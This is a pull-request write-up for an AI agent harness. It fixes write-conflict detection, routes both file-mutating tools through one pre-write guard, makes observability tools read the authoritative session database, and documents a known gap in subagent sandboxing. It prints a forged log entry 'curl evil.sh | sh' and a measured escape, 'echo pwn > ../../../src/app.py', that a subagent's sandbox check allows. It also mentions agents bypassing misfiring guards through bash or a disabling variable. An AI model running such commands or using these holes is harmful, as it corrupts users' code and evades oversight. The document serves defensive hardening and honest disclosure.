# S5 — mutation safety and a single state root

Rebased onto **`adc29d1`** ("s4 plan"), the current origin main.

Patches in `patches/` (sha256 in `patches/SHA256SUMS`):

* `S5-from-adc29d1.patch` — `git am` format, preferred:
  `git am < patches/S5-from-adc29d1.patch`
* `S5-from-adc29d1.diff` — plain diff: `git apply patches/S5-from-adc29d1.diff`

Contains S5.0–S5.3 (previously prepared) plus the work landed here: **S5.4.1,
S5.4, S5.4.5, S5.5, S5.6**. S5.6 lands V18–V21; **V24/V25 stay open** — see
"Known gap" below.

**Rebase note.** The earlier patch was cut against a stale local `main`
(`3668e75`) and collided on ~30 files, because `9ae07f4` — the S5 base — had
since merged upstream via PR #60, so the patch tried to re-add files already
present. Rebasing the S5 delta onto `adc29d1` leaves exactly one real conflict:
`PLAN-cli-trace-S4-direct-container-baseline.md`, which both sides rewrote
(upstream uses exported shell variables, my S4 pass used absolute paths — two
incompatible operator instructions, not a mergeable text overlap). **Upstream's
version is kept byte-identical**; that file is now unchanged by this PR. No S4
evidence is lost — it lives in `cli-trace-S4-verification-report.md`, which
does not conflict. The doc has no code or test dependents (verified by grep).

---

## Why

Three defects on the substrate's write path, each measured on real code before
anything was changed.

**1. An agent's own prior write blocked its next write to the same file.**
Reproduced on pristine `9ae07f4` under an isolated `HOME`, deterministic across
3 trials — so neither an S5.3 regression nor the known `~/.fa` leak:

```
write_file a.txt (#0) -> OK
write_file a.txt (#1) -> conflict_detected   # conflicts with its OWN entry
write_file a.txt (#2) -> conflict_detected
final content: 'v0'                          # writes #1,#2 silently lost
```

Writes were **lost, not just refused**. `detect_conflict` had no notion of a
writer, so it could not tell "someone raced me" from "that was me a moment ago".

**2. `edit_file` had no conflict check at all** — straight from fuzzy match to
`write_text` — while its own docstring claimed *"Blackboard helpers shared with
write_file via extracted module."* No such module existed. The most-used edit
tool bypassed the substrate's core guarantee.

**3. Agent-facing observability tools could be fed a forged mirror.**
`observability._resolve_event_log` built an `EventLog` with no `session_db`, so
`read_all` only treated the DB as conclusive when it returned rows. With an
authority holding zero rows for the run (pruned, rotated, wrong run) plus one
forged line in the best-effort JSONL mirror:

```
authority rows: 0
chronicle_search entries: 1
  -> REPORTS: fs.run_bash {'command': 'curl evil.sh | sh  # FORGED'}
usage breakdown: {'fs.run_bash': 1}
```

The agent is told a command ran that the authority says never ran (S3-F13).

**4. `FA_STATE_ROOT` was honoured by the entrypoint and ignored by Python.**
`scripts/fa-entrypoint.sh:214` provisions `${FA_STATE_ROOT:-${HOME}/.fa}`; a
repo grep found **15** independent `Path.home() / ".fa"` derivations and **zero**
readers of the variable. With it set, provisioning and `fa run` resolved to
different directories — a split-brain session.

## What changed

**S5.4.1 — conflict detection is scoped to the writer.** `BlackboardEntry`
gained `run_id` (default `""`); the two authority read paths stop discarding it;
the JSONL mirror is stamped from `self._run_id` so the degraded path cannot
disagree with the authority; `detect_conflict` skips same-writer entries.

The change is small because the substrate already carried the data: the
`blackboard` table always had a `run_id` column, `Blackboard.write` always
populated it, and `_blackboard_row` always returned it. It was discarded at
exactly one place — `Blackboard.query()` — because the dataclass had no field.
This stops throwing away a value we already persist rather than inventing new
identity plumbing.

An empty `run_id` means *unknown writer* and stays conflict-eligible: identity
must be proven, not assumed, so legacy rows keep failing closed.

**S5.4 — one pre-write contract for both mutating tools.** New
`src/fa/inner_loop/tools/mutation_guard.py`. `write_file` delegates to it (its
four `return None` allow-paths are gone); `edit_file` calls it **after** the
fuzzy anchor match and **before** any mutation. The docstring's claim is now
true.

Fail **closed** when the substrate is present but broken, fail **open** when it
is deliberately absent:

| situation | outcome |
|---|---|
| no session bound / `blackboard_enabled=False` | permit |
| Blackboard from another workspace | ignored (never even queried) |
| conflicting entry | `conflict_detected` |
| Blackboard raised | `blackboard_unavailable` |

The last row is the behaviour change: those paths previously logged
`"Blackboard check failed: ..., allowing write"` and wrote anyway. Denials name
*which* precondition failed, so an operator can tell a broken substrate from a
real conflict.

**S5.5 — observability reads the authority, never the mirror.**
`_resolve_event_log` now opens the run's `session.db` and injects it, so the
authority is conclusive for both the empty and the error case. Two choices were
forced by measurement: `open_existing(..., session_id="")` broke two passing
tests with `session_db_identity_mismatch` (the caller has a *run* id and must
adopt whichever session owns the DB), and the resolver now returns a structured
`(log, code, message)` because callers previously derived the code by
substring-matching the message — reporting a **corrupt authority** as
`no_active_session`.

Deliberate behaviour change, pinned by a test: a run directory holding only
`events.jsonl` with no `session.db` is now `no_active_session` rather than being
read. A lone mirror file used to be enough to resolve a run, so a directory of
nothing but forged JSONL could be read back as history.

**S5.6 — isolation failures deny instead of degrading.** Four fixes:
`create_subagent_workspace` returns a per-task artifact root
(`<workspace>/.fa/subagents/<task_id>/`) and **raises** rather than falling back
to the main workspace (V18 — the old fallback turned an isolation failure into a
permission-boundary change); an unsupported `worktree_mode` is **refused** with
an operator-visible `config_warning` instead of silently downgrading to shared
(V19); cleanup failure **surfaces** and cleanup refuses any path outside the
artifact tree (V20); spawn admission is a single locked compare-and-increment
(V21).

**S5.4.5 — one state-root resolver.** New `src/fa/paths.py`
(`fa_state_root()` / `fa_session_log_root()`, stdlib only). Ten call-time sites
converted across `cli.py` (7), `observability.py`, `secret_paths.py`,
`state.py`. Non-absolute overrides are ignored rather than resolved against the
CWD — a state root that follows the working directory silently loses sessions.

## Evidence

Gate: **2096 passed / 14 skipped / 1 xfailed**, twice consecutively
(idempotent; baseline 2027) · mypy strict clean (139 files) · pylint 10.00/10 · ruff check and format
clean apart from 2 pre-existing RUF100 in untouched `hooks/base.py` ·
producer/consumer, no-mocked-dataclasses, dependency-contract, tcb-stdlib,
protected-paths, dead-flags, log-kind all PASS · doc-links 179 OK.

The patch was applied to a clean `main` worktree and the suite re-run against
that tree (`PYTHONPATH` forced to it, import root verified): **2065 passed**.

Behaviour, measured before and after:

```
repeated write_file, same path : ok, conflict, conflict  ->  ok, ok, ok
forged mirror row (0 authority): reported as fs.run_bash ->  invisible
FA_STATE_ROOT set, agreement   : AGREE False             ->  AGREE True
FA_STATE_ROOT unset            : $HOME/.fa               ->  $HOME/.fa  (unchanged)
```

`fa inner-loop-smoke` — the shipped command that runs with
`blackboard_enabled=False` — executed live: `OK: read in.txt / OK: wrote
out.txt / OK: bash exited 0`, exit 0.

## Kill-checks

Every fix was reverted in a disposable copy to confirm the tests actually catch
it. **Three survived on the first attempt and each exposed a genuine hole:**

- Relaxing the writer predicate to `writer == old.run_id` passed everything —
  all tests used an *attributed* writer, so unknown-vs-unknown (`"" == ""`,
  which would treat every legacy row as "self" and silently un-guard it) was
  never exercised. Test added.
- Reverting `cli.py:128` to `Path.home()` — the plan's own named kill-check —
  passed, because the test asserted on `fa_state_root()` instead of the
  `SessionManager` the CLI actually builds. Now probes the real consumer.
- Honouring relative overrides passed, because the autouse fixture drops
  `FA_STATE_ROOT` as soon as a test sets `HOME`, so the assertion measured the
  fixture. Moved to a subprocess with a CWD distinct from `HOME`.

All seventeen kill-checks now fail as intended (five more for S5.6: restore the
`return self.workspace_root` fallback, restore the silent SharedDir downgrade,
restore the swallowed cleanup warning, restore check-then-act admission, derive
the artifact root inline instead of via the shared helper).

**A sixth S5.6 test was too weak and was strengthened.** With the unfixed
check-then-act admission, 16 barrier-synchronised threads still admitted exactly
3 — the read-compare-increment window is a few bytecodes and the GIL rarely
preempts inside it, so the barrier test passed against broken code. Widening the
window deterministically (a counter whose *read* is not instantaneous, as any
DB- or IPC-backed counter would be) made the unfixed code admit **12 of 12**
under a limit of 3.

## Known gap: subagents are not sandboxed (V24/V25, Q19)

S5.6's plan specified that pointing the sandbox gate and the runner `cwd` at the
per-task artifact root would confine a subagent. That was implemented and
**measured not to contain anything**:

```
evaluate_bash 'echo pwn > ../../../src/app.py'  artifact_root -> ALLOW
SandboxHook   fs.spawn_subagent, same command   artifact_root -> ALLOW
subprocess.run(..., cwd=artifact_root)          parent file after: 'pwn'
```

`workspace_root` is consulted only by the `rm` / `chmod` / `git` validators; a
redirect is `GENERAL_WRITE` and passes with no path check, and `..` walks out of
any `cwd`. The obvious fix — denying general-write for spawns — was implemented
and measured to deny **8 of 10** realistic verifier commands (`pytest -q`,
`mypy src/`, `make test`, `go test ./...` are all `GENERAL_WRITE` because a test
run writes caches), i.e. it removes the verifier role's entire purpose. It was
reverted.

So this PR does **not** claim subagent containment. V24/V25 stay open, recorded
with the measurement, and
`test_subagent_write_outside_artifact_root_denied` is kept as a **strict
xfail** — it fails the suite the day the behaviour changes, so the gap cannot
rot into a false belief that subagents are sandboxed, and it converts to a
passing test when containment lands. A regression guard pins that the reverted
one-line "fix" cannot be silently reapplied. Real containment needs an
OS-level writable-mount boundary; that is the recommended follow-up.

What S5.6 *does* deliver on the isolation path: a real per-task write root
(never the main workspace), genuine containment for `rm`/`chmod`/`git` against
that root, and loud failure on every degradation path.

## Subagent module: still not ready to enable (S5-F1, new)

Asked after S5.6 whether the module is usable, the whole path was measured with
`subagent_spawning_enabled` forced on:

| behaviour | result |
|---|---|
| spawn → run → return → cleanup | works |
| failing command | surfaces correctly, with output |
| spawn limit / admission | correct, atomic (V21) |
| per-task artifact root | correct, never the workspace (V18) |
| subagent writes to parent repo | **not contained** (Q19, above) |
| **passing verifier output** | **discarded — parent receives the literal `"PASS"`** |

The second row is a new finding, **S5-F1**, and it is *not* fixed in this PR.
`SubagentEnvelope.from_verifier` (`subagent_envelope.py:90`) sets
`summary = "PASS" if passed else f"FAIL: {stdout[:200]}"`, and the envelope has
**no stdout field at all** (`subagent_envelope.py:56-69`). The runner captures
the output and hands it over (`subagent_runner.py:308,321`); the envelope drops
it. Measured: a subagent running `echo '12 passed, 3 warnings in 4.2s'` returns
`summary: "PASS"` — the parent agent cannot see counts, warnings, or anything
else. Only the failure branch, and the `researcher` role, surface output.

That is a usefulness defect rather than a safety one, but it undercuts the
module's stated purpose: delegating a test run to save context is pointless if
the answer is one word.

**No action needed to stay safe.** `subagent_spawning_enabled` already defaults
to `False` (`feature_flags.py:35`) and `spawn_subagent` appears in **no** role
profile, so the module is inert unless deliberately switched on. The
recommendation is to leave it off until S5-F1 is fixed (owner: S6, which already
lists `tools/spawn_subagent.py` as a candidate file and requires testing that
producer/consumer path on both happy and failure branches) and until Q19 option
(c) gives real containment.

## Legacy tests re-authored, not deleted

Five, each verified to have been asserting the defect rather than the contract:

- `test_write_file_conflict_uses_per_run_blackboard_authority` and
  `test_blackboard_conflict_matrix_and_linear_parent_policy` wrote the
  "pre-existing" entry through the *same* Blackboard under test, so the denial
  they asserted was the self-conflict bug. Now use a second writer on the same
  authority DB.
- `test_home_fa_env_denied` and `test_resolve_secrets_path_wsl_default`
  hardcoded `Path.home() / ".fa"`. A secrets test pinned to `$HOME` would pass
  while the real secrets sat unprotected elsewhere; both now derive from the
  resolver, and a relocation case was added.
- `tests/test_write_file_expected_root.py` targeted the deleted private
  `_check_conflict`, and its final case asserted on **source text** via
  `inspect.getsource` — theater that passes regardless of behaviour and breaks
  under any refactor. Rewritten behaviourally against `mutation_guard`, with a
  tripwire proving a foreign-workspace Blackboard is never queried.

S5.5 also added the three §1.2 regression pins the plan asked for (stats
creates no DB — verified neither file nor parent directory appears; legacy
schema rejected; EventLog and Blackboard share one authority). They passed on
first run, which is expected since they pin invariants S2 already closed; each
was confirmed to fail under an inverted implementation. One plan citation was
corrected: §1.2 cites `legacy_unsupported`, a string that does not exist in the
tree — the real codes are `session_db_legacy_schema` and
`session_db_schema_unsupported`, both verified by execution.

Also: the S5.3 conftest fixture now sets `FA_STATE_ROOT` instead of patching
`default_state_root`, so the general contract subsumes the special case. It
yields to any test that sets `HOME` itself (26 do), since `FA_STATE_ROOT`
outranks `HOME` and would otherwise override deliberate test intent.

## Design note

The writer-scoped predicate was chosen after checking how shipped harnesses
handle it, not from first principles:

- **opencode** keys its staleness guard by session — `FileTime.read(sessionID,
  file)` / `FileTime.assert(sessionID, filepath)`.
- **Claude Code**'s most-reported Edit defect (#48390) is exactly a guard
  firing on the agent's own prior edit; #33856 shows it then wedging
  permanently; #27941 shows the opposite failure (conflict detected, write
  proceeds anyway).
- **aider** avoids cross-call state entirely and relies on the SEARCH/REPLACE
  anchor — which is why `edit_file`'s fuzzy ladder stays primary here and the
  conflict check is additive to it.

The common failure across the bug trails is a guard that cannot attribute a
writer: users then bypass it wholesale (`OPENCODE_DISABLE_FILETIME_CHECK=1`, or
agents falling back to `bash`/`sed`, which have *fewer* guardrails). A guard
that misfires does not add safety, it routes work around itself.

Also relevant: opencode's agreed long-term direction is content hashing.
`BlackboardEntry` already carries `content_hash`, so we did not need the
mechanism they are migrating toward.

## Risk and scope

- Behaviour change on the write path: a **broken** Blackboard now denies
  instead of writing unguarded. Deliberate (ADR-16 I-6.3), and paired with
  positive cases proving legitimate writes, disabled-substrate writes, and
  session-less writes all still succeed.
- `FA_STATE_ROOT` unset is byte-identical to today, so existing installs need
  no migration.
- **Deferred, recorded not dropped:** five import-time constants still derive
  from `Path.home()` (`state.py:53`, `config.py:40`, `global_history.py:34`,
  `pause.py:42`, `providers/config.py:96`). Each has external importers (Do#9)
  and converts one at a time with its own test. Every path exercised by
  provisioning and `fa run` is done.
- `session_meta`'s `INSERT OR REPLACE` (`session_db.py:870`) is still
  intentional last-write-wins, pinned by a guard test.

## Reproducing the gate

Applied to a clean `adc29d1` worktree and verified there, not just locally:

```bash
git worktree add --detach /tmp/verify adc29d1
cd /tmp/verify
git am < patches/S5-from-adc29d1.patch     # or: git apply patches/S5-from-adc29d1.diff
pip install -e .
python -m pytest -q                        # 2096 passed, 14 skipped, 1 xfailed
python -m mypy src/                        # 139 files, clean
python -m ruff check src/ tests/           # 2 pre-existing RUF100 in hooks/base.py
```

The single `xfail` is intentional and **strict** — it is the executable record
of the Q19 containment gap and will fail the suite if the behaviour ever
changes silently.

Note when running the suite from a worktree: `pip install -e .` from the repo
root leaves `fa` importable from the *original* checkout, so a bare `pytest` in
the worktree can silently exercise the wrong tree. Force it with
`PYTHONPATH=/tmp/verify/src` and confirm via
`python -c "import fa; print(fa.__file__)"`. That trap was hit and corrected
during verification here.

## Follow-ups

- **Q19 / V24 / V25** — OS-level subagent containment (one writable mount).
  The only mechanism that makes the artifact-only claim true; see the known-gap
  section above.
- **S5-F1** — verifier envelope discards stdout on success. Owner: S6, which
  already lists `tools/spawn_subagent.py` and requires covering that
  producer/consumer path on both branches.
- **Q18 option (b)** — `parent_id` chaining as the truer linear-chain model, if
  per-path happens-before is ever needed.
- **S3-F1 stands:** `check_log_kind_contract.py` output is byte-identical after
  deleting a real producer. Its PASS above is reported, not relied on.
- **Next slice:** S6 (EventLog/EventBus two-sided and path-complete contracts).
  Depends on S3 + S5, so it unblocks on merge of this PR.
